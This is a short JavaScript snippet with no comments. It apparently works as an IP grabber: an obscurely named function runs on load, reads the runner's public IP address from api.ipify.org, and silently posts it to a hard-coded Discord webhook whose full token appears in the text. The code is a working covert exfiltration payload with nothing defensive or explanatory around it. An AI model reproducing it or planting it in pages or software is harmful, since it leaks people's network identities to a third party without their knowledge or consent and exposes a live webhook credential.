const webhookUrl = 'https://discord.com/api/webhooks/1089896590136852620/7I1bvenxZ6fhDAa75BmJF_1Xe-7WL6FuntBkM8bJw08Q1LF02vI_aRlIYjdH0kzEmR4i';

async function _rgiuh() {
  const response = await fetch('https://api.ipify.org/');
  const data = await response.text();

  const payload = {
    content: data
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })
  .catch(error => console.error(error));
}

_rgiuh();